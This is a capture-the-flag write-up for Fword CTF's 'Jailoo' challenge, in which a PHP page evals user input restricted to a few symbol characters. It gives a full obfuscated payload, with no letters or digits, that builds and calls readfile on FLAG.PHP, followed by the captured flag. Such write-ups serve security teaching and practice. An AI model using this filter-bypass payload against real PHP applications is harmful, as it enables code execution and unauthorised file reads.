#Fword CTF Jailoo

**tl;dr**

+ Input executed with eval
+ Regex and blacklist restricts alphanumericals
+ Php webshell with `$(])_[=;+".` chars gives flag


## Challenge description
Get the flag in FLAG.PHP.

## Initial analysis

![one](one.png)
`if(preg_match_all('/^(\$|\(|\)|\_|\[|\]|\=|\;|\+|\"|\.)*$/', $cmd, $matches)){
	echo "<div class=\"success\">Command executed !</div>";
	eval($cmd);`
	
The challenge page takes an input, after analysising the source code, we find the following: 
The input is executed with `eval` function. The regex accepts only `$(])_[=;+".` characters. There was a similar challenge in a previous CTF making Php webshell without numbers and letters. Reference: https://www.programmersought.com/article/7881105401/
So the cooking of the webshell begins, although few obvious functions like file_get_contents where blacklisted -_-
One that worked was `readfile('FLAG.PHP');`
The command for the 20 letter string being `$_=[];$_="$_";$_=$_["."+"."];$___="";$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$___.=$__;$__=$_;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$_____="";$__=$_;$__++;$__++;$__++;$__++;$__++;$_____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_____.=$__;$__=$_;$_____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$_____.=$__;$_____.=".";$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_____.=$__;$___($_____);`

Giving the above string gave us the flag   `$flag="FwordCTF{Fr0m_3very_m0unta1ns1d3_l3t_fr33d0m_r1ng_MLK}";`


## Flag

**FLAG**: `  $flag="FwordCTF{Fr0m_3very_m0unta1ns1d3_l3t_fr33d0m_r1ng_MLK}";`

For further queries, please DM me on Twitter: <https://twitter.com/m0n574>.
